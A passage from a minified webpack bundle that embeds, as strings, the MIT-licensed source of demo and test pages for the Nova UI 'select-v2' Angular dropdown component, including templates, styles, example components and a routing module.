OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-select-v2-reactive-form-field-example",\n    templateUrl: "./select-v2-reactive-form-field.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2ReactiveFormFieldExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public fancyForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.fancyForm = this.formBuilder.group({\n            select: this.formBuilder.control("", Validators.required),\n        });\n    }\n}\n'},59108:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<b>Setting value using <code>value</code> input</b>\n<nui-select-v2 [value]="items[0]" placeholder="Select Item" i18n-placeholder>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n\n<br />\n\n<b>Setting value using <code>FormControl</code></b>\n<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="selectControl"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n'},64772:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-select-v2-setting-value-example",\n    templateUrl: "select-v2-setting-value.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2SettingValueExampleComponent implements OnInit {\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public selectControl = new FormControl<string | null>(null);\n\n    public ngOnInit(): void {\n        this.selectControl.setValue(this.items[1]);\n    }\n}\n'},13540:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [overlayConfig]="config"\n    style="max-width: 50%"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n'},15972:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="// This is how the global styles look like\n\n.nui-overlay-styling-demo-custom-class {\n    border: 1px solid red;\n\n    .nui-overlay {\n        border: 2px red dashed;\n        padding: 10px;\n        background-color: antiquewhite;\n    }\n}\n"},66020:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport { OVERLAY_WITH_POPUP_STYLES_CLASS } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-v2-styling-example",\n    templateUrl: "./select-v2-styling.example.component.html",\n    styleUrls: ["./select-v2-styling.example.component.less"],\n    host: { class: "select-container" },\n    // This is done to make class from the less file global.\n    // Make sure the class from the less file is added to your global style sheet.\n    encapsulation: ViewEncapsulation.None,\n})\nexport class SelectV2StylingExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n\n    public config: OverlayConfig = {\n        panelClass: [\n            OVERLAY_WITH_POPUP_STYLES_CLASS,\n            "nui-overlay-styling-demo-custom-class",\n        ],\n    };\n}\n'},91654:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='\x3c!-- Focus drop is an invisible item which can be used to drop the focus state to the start of the page if needed --\x3e\n<div class="select-test-focus-drop" tabindex="-1"></div>\n\n<div class="row mb-3 justify-content-center">\n    <h1>Select V2 Testing Page</h1>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <h4>Error State</h4>\n        <nui-select-v2\n            [isInErrorState]="isInErrorState()"\n            id="error-state"\n            placeholder="Select Item"\n            i18n-placeholder\n            [formControl]="selectControl"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of items"\n                [value]="item"\n                i18n\n                >{{ item }}</nui-select-v2-option\n            >\n        </nui-select-v2>\n    </div>\n    <div class="col">\n        <h4>Reactive form</h4>\n        <form [formGroup]="fancyForm">\n            <nui-form-field\n                caption="Select"\n                i18n-caption\n                hint="Some pretty long text with hint"\n                i18n-hint\n                info="text"\n                [control]="fancyForm.controls[\'select\']"\n            >\n                <nui-select-v2\n                    placeholder="Select Item"\n                    i18n-placeholder\n                    id="reactive-form"\n                    formControlName="select"\n                >\n                    <ng-container *ngFor="let item of items">\n                        <nui-select-v2-option [value]="item" i18n>\n                            {{ item }}\n                        </nui-select-v2-option>\n                    </ng-container>\n                </nui-select-v2>\n                <nui-validation-message for="required" i18n>\n                    This field is required\n                </nui-validation-message>\n            </nui-form-field>\n        </form>\n    </div>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <h4>Basic</h4>\n        <nui-select-v2 placeholder="Select Item" i18n-placeholder id="basic">\n            <nui-select-v2-option\n                *ngFor="let item of items"\n                [value]="item"\n                i18n\n                >{{ item }}</nui-select-v2-option\n            >\n        </nui-select-v2>\n    </div>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <h4>Display value (max-width = 200px)</h4>\n        <nui-select-v2\n            placeholder="Select Item"\n            [displayValueTemplate]="iconsOnly"\n            [style.max-width.px]="200"\n            id="display-value-mw200"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of itemsWithIconsOnly"\n                [value]="item"\n            >\n                String can\'t get long, can it?:)\n                <nui-icon [icon]="item.icon"></nui-icon\n            ></nui-select-v2-option>\n        </nui-select-v2>\n    </div>\n    <div class="col">\n        <h4>Display value (no width rescrictions)</h4>\n        <nui-select-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            [displayValueTemplate]="temp"\n            id="display-value"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of itemsDisplayValue"\n                [value]="item"\n                i18n\n                [isDisabled]="item.disabled"\n            >\n                Name is {{ item.name }} and icon is\n                <nui-icon [icon]="item.icon"></nui-icon\n            ></nui-select-v2-option>\n        </nui-select-v2>\n    </div>\n    <div class="col">\n        <h4>Grouped items</h4>\n        <nui-select-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            [displayValueTemplate]="displayValueTemplate"\n            id="grouped"\n        >\n            <ng-container\n                *ngFor="let itemGroup of groupedItems; let last = last"\n            >\n                <nui-select-v2-option-group>\n                    <span class="nui-select-v2-option-group--header">{{\n                        itemGroup.header\n                    }}</span>\n                    <nui-select-v2-option\n                        *ngFor="let item of itemGroup.items"\n                        [value]="item"\n                    >\n                        {{ item.name }}\n                    </nui-select-v2-option>\n                    <nui-divider *ngIf="!last" size="extra-small"></nui-divider>\n                </nui-select-v2-option-group>\n            </ng-container>\n        </nui-select-v2>\n    </div>\n</div>\n<div class="row mb-3 align-items-center">\n    <div class="col">\n        <h4>Inline</h4>\n        <p>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit,\n            <nui-select-v2\n                class="d-inline-flex mr-3"\n                placeholder="Select Item"\n                i18n-placeholder\n            >\n                <ng-container *ngFor="let item of items">\n                    <nui-select-v2-option [value]="item" i18n>\n                        {{ item }}\n                    </nui-select-v2-option>\n                </ng-container>\n            </nui-select-v2>\n            sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\n            Massa id neque aliquam vestibulum morbi. Vestibulum rhoncus est\n            pellentesque elit ullamcorper. Adipiscing enim eu turpis egestas\n            pretium aenean pharetra magna.\n            <nui-select-v2\n                class="d-inline-flex"\n                placeholder="Select Item"\n                i18n-placeholder\n            >\n                <ng-container *ngFor="let item of items">\n                    <nui-select-v2-option [value]="item" i18n>\n                        {{ item }}\n                    </nui-select-v2-option>\n                </ng-container>\n            </nui-select-v2>\n            At erat pellentesque adipiscing commodo. Justo donec enim diam\n            vulputate. Libero volutpat sed cras ornare arcu.\n        </p>\n    </div>\n    <div class="col">\n        <h4>Custom overlay styles</h4>\n        <nui-select-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            [formControl]="selectControl"\n            id="overlay-styles"\n            [overlayConfig]="customStylesOverlayConfig"\n        >\n            <ng-container *ngFor="let item of items">\n                <nui-select-v2-option [value]="item" i18n>\n                    {{ item }}\n                </nui-select-v2-option>\n            </ng-container>\n        </nui-select-v2>\n    </div>\n    <div class="col">\n        <h4>Disabled</h4>\n        <nui-select-v2\n            [isDisabled]="true"\n            placeholder="Select Item"\n            i18n-placeholder\n            id="disabled"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of items"\n                [value]="item"\n                i18n\n                >{{ item }}</nui-select-v2-option\n            >\n        </nui-select-v2>\n    </div>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <button id="dialog-btn" (click)="open(content)" i18n>\n            Call dialog with select\n        </button>\n    </div>\n    <div class="col"></div>\n    <div class="col">\n        <h4>Custom control</h4>\n        <nui-select-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            [manualDropdownControl]="true"\n            #custom_control\n            id="custom-control"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of items"\n                [value]="item"\n                i18n\n            >\n                {{ item }}\n            </nui-select-v2-option>\n        </nui-select-v2>\n\n        <div class="row m-auto align-items-center">\n            <button\n                #show\n                id="show"\n                type="button"\n                class="mt-2"\n                (click)="showList($event)"\n            >\n                Show\n            </button>\n\n            <button\n                #hide\n                id="hide"\n                type="button"\n                class="mt-2"\n                (click)="hideList($event)"\n            >\n                Hide\n            </button>\n\n            <button\n                #toggle\n                id="toggle"\n                type="button"\n                class="mt-2"\n                (click)="toggleList($event)"\n            >\n                Toggle\n            </button>\n\n            <nui-switch [(value)]="handleClicksOutside" i18n id="switch">\n                Close on focus-out\n            </nui-switch>\n        </div>\n    </div>\n</div>\n\n<ng-template #temp let-item let-open="open">\n    <div class="nui-select-v2__value">\n        <div\n            *ngIf="item; else empty"\n            class="d-flex align-items-center nui-select-v2__value-content"\n        >\n            <nui-icon class="mr-2" [icon]="item.icon"></nui-icon>\n            {{ item.name }}\n        </div>\n\n        <nui-icon\n            [style.transform]="open ? \'rotate(180deg)\' : \'\'"\n            icon="caret-down"\n        ></nui-icon>\n    </div>\n</ng-template>\n\n<ng-template #iconsOnly let-item let-open="open">\n    <div class="nui-select-v2__value">\n        <div\n            *ngIf="item; else empty"\n            class="d-flex align-items-center nui-select-v2__value-content"\n        >\n            <nui-icon class="mr-2" [icon]="item.icon"></nui-icon>\n            {{ item.name }}\n        </div>\n\n        <nui-icon\n            [style.transform]="open ? \'rotate(180deg)\' : \'\'"\n            icon="caret-down"\n        ></nui-icon>\n    </div>\n</ng-template>\n\n<ng-template #displayValueTemplate let-item let-open="open">\n    <div class="nui-select-v2__value">\n        <div\n            *ngIf="item; else empty"\n            class="d-flex align-items-center nui-select-v2__value-content"\n        >\n            {{ item.name }}\n        </div>\n\n        <nui-icon\n            [style.transform]="open ? \'rotate(180deg)\' : \'\'"\n            icon="caret-down"\n        ></nui-icon>\n    </div>\n</ng-template>\n\n<ng-template #content let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <nui-select-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            id="inside-dialog"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of items"\n                [value]="item"\n                i18n\n                >{{ item }}</nui-select-v2-option\n            >\n        </nui-select-v2>\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="close()" i18n>Cancel</button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="close()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<ng-template #empty>\n    <span class="nui-select-v2__placeholder">Select Item</span>\n</ng-template>\n'},47350:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".select-test-focus-drop {\n    height: 1px;\n    width: 1px;\n}\n\n.custom-select-styles.nui-overlay-panel {\n    .nui-overlay {\n        height: 200px;\n        background-color: deepskyblue;\n        border-radius: 5%;\n    }\n}\n"},69362:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport {\n    AfterViewInit,\n    Component,\n    Inject,\n    OnDestroy,\n    OnInit,\n    TemplateRef,\n    ViewChild,\n    ViewEncapsulation,\n} from "@angular/core";\nimport { FormBuilder, FormControl, Validators } from "@angular/forms";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    DialogService,\n    ISelectGroup,\n    NuiDialogRef,\n    OVERLAY_WITH_POPUP_STYLES_CLASS,\n    SelectV2Component,\n} from "@nova-ui/bits";\n\ninterface IExampleItem {\n    id: string;\n    name?: string;\n    icon?: string;\n    disabled?: boolean;\n}\n\n@Component({\n    selector: "nui-select-v2-test-example",\n    templateUrl: "./select-v2-test.example.component.html",\n    styleUrls: ["./select-v2-test.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n    host: { class: "select-container" },\n})\nexport class SelectV2TestExampleComponent\n    implements OnInit, AfterViewInit, OnDestroy\n{\n    public selectedItem: IExampleItem | null;\n    public handleClicksOutside: boolean = false;\n    public iconItems = [\n        "status_warning",\n        "status_up",\n        "status_critical",\n        "status_reserved",\n        "status_unplugged",\n        "status_unknown",\n        "status_down",\n        "status_missing",\n        "status_sleep",\n    ];\n    // Datasources\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public itemsDisplayValue: IExampleItem[] = Array.from({ length: 100 }).map(\n        (_, i) => ({\n            id: `value-${i}`,\n            name: $localize`Item ${i}`,\n            icon: "status_warning",\n            disabled: !!(i % 2),\n        })\n    );\n    public itemsWithIconsOnly: IExampleItem[] = this.iconItems.map(\n        (icon, i) => ({\n            id: `value-${i}`,\n            icon: icon,\n        })\n    );\n    public groupedItems: ISelectGroup[] = Array.from({ length: 10 }).map(\n        (_, i) => ({\n            header: $localize`Header line ${i + 1}`,\n            items: Array.from({ length: 5 }).map((v, n) => ({\n                id: `value-${i}`,\n                name: $localize`Item ${n + 1}`,\n            })),\n        })\n    );\n    // Form\n    public selectControl = new FormControl<IExampleItem | null>(null);\n    public fancyForm;\n    // Test\n    public customStylesOverlayConfig: OverlayConfig = {\n        panelClass: [OVERLAY_WITH_POPUP_STYLES_CLASS, "custom-select-styles"],\n    };\n    private destroy$ = new Subject<void>();\n    private activeDialog: NuiDialogRef;\n    @ViewChild("custom_control") private select: SelectV2Component;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        private formBuilder: FormBuilder\n    ) {\n        this.fancyForm = this.formBuilder.group({\n            select: this.formBuilder.control("", Validators.required),\n        });\n    }\n\n    // Dialog\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, { size: "sm" });\n    }\n\n    public isInErrorState(): boolean {\n        return !this.selectedItem;\n    }\n\n    public showList(event: Event): void {\n        event.stopPropagation();\n        this.select.showDropdown();\n        this.select.inputElement.nativeElement.focus();\n    }\n\n    public hideList(event: Event): void {\n        event.stopPropagation();\n        this.select.hideDropdown();\n    }\n\n    public toggleList(event: Event): void {\n        event.stopPropagation();\n        this.select.toggleDropdown();\n        this.select.inputElement.nativeElement.focus();\n    }\n\n    public ngOnInit(): void {\n        this.selectControl.valueChanges\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((value) => {\n                this.selectedItem = value;\n            });\n    }\n\n    public ngAfterViewInit(): void {\n        this.select.clickOutsideDropdown.subscribe(() => {\n            if (this.handleClicksOutside) {\n                this.select.hideDropdown();\n            }\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n}\n'},70064:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="selectControl"\n>\n    <cdk-virtual-scroll-viewport\n        itemSize="30"\n        [minBufferPx]="containerHeight"\n        [maxBufferPx]="containerHeight * 2"\n        [style.height.px]="containerHeight"\n    >\n        <div *cdkVirtualFor="let item of items; index as i">\n            <nui-select-v2-option\n                [value]="item"\n                [index]="i"\n                class="d-flex align-items-center"\n            >\n                {{ item }}\n            </nui-select-v2-option>\n        </div>\n    </cdk-virtual-scroll-viewport>\n</nui-select-v2>\n'},12707:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    Component,\n    HostListener,\n    OnDestroy,\n    OnInit,\n    ViewChild,\n} from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport { SelectV2Component } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-v2-virtual-scroll-example",\n    templateUrl: "select-v2-virtual-scroll.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2VirtualScrollExampleComponent\n    implements OnInit, OnDestroy, AfterViewInit\n{\n    public icons: any[] = ["check", "email", "execute"];\n    public items = Array.from({ length: 100000 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n\n    public selectControl = new FormControl<string | null>(null);\n    public containerHeight: number = 300;\n\n    private readonly destroy$ = new Subject<void>();\n    private scrollOffset: number = 0;\n\n    @ViewChild(CdkVirtualScrollViewport)\n    private viewport: CdkVirtualScrollViewport;\n    @ViewChild(SelectV2Component) private select: SelectV2Component;\n\n    @HostListener("click", ["$event"])\n    public handleClick(event: MouseEvent): void {\n        if (this.viewport) {\n            this.viewport.scrollToOffset(this.scrollOffset);\n        }\n    }\n\n    public ngOnInit(): void {\n        this.selectControl.valueChanges\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((value) => {\n                console.log("Value from Select", value);\n            });\n    }\n\n    public ngAfterViewInit(): void {\n        this.select.valueSelected\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((selectionText) => {\n                this.scrollOffset = this.viewport.measureScrollOffset();\n            });\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n}\n'},33891:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ScrollingModule } from "@angular/cdk/scrolling";\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDialogModule,\n    NuiDividerModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiIconModule,\n    NuiMessageModule,\n    NuiOverlayAdditionsModule,\n    NuiSelectV2Module,\n    NuiSwitchModule,\n    NuiValidationMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    SelectV2BasicExampleComponent,\n    SelectV2ColorPickerComponent,\n    SelectV2CustomContentExampleComponent,\n    SelectV2CustomControlExampleComponent,\n    SelectV2CustomizeOptionsExampleComponent,\n    SelectV2DisabledExampleComponent,\n    SelectV2DocsComponent,\n    SelectV2ErrorExampleComponent,\n    SelectV2GettingValueExampleComponent,\n    SelectV2GroupedItemsExampleComponent,\n    SelectV2InlineExampleComponent,\n    SelectV2OptionsChangedExampleComponent,\n    SelectV2OverlayConfigExampleComponent,\n    SelectV2ReactiveFormFieldExampleComponent,\n    SelectV2SettingValueExampleComponent,\n    SelectV2StylingExampleComponent,\n    SelectV2TestExampleComponent,\n    SelectV2VirtualScrollExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: SelectV2DocsComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "basic",\n        component: SelectV2BasicExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "getting-value",\n        component: SelectV2GettingValueExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "setting-value",\n        component: SelectV2SettingValueExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "customize-options",\n        component: SelectV2CustomizeOptionsExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "grouped",\n        component: SelectV2GroupedItemsExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "disabled",\n        component: SelectV2DisabledExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "error",\n        component: SelectV2ErrorExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "inline",\n        component: SelectV2InlineExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "styling",\n        component: SelectV2StylingExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "virtual-scroll",\n        component: SelectV2VirtualScrollExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "overlay-config",\n        component: SelectV2OverlayConfigExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "reactive-form",\n        component: SelectV2ReactiveFormFieldExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "custom-control",\n        component: SelectV2CustomControlExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "custom-content",\n        component: SelectV2CustomContentExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "options-changed",\n        component: SelectV2OptionsChangedExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "color-picker",\n        component: SelectV2ColorPickerComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "test",\n        component: SelectV2TestExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiIconModule,\n        NuiDividerModule,\n        NuiSelectV2Module,\n        ReactiveFormsModule,\n        FormsModule,\n        NuiSwitchModule,\n        NuiValidationMessageModule,\n        NuiFormFieldModule,\n        NuiDocsModule,\n        NuiMessageModule,\n        ScrollingModule,\n        NuiDialogModule,\n        NuiOverlayAdditionsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        SelectV2BasicExampleComponent,\n        SelectV2DisabledExampleComponent,\n        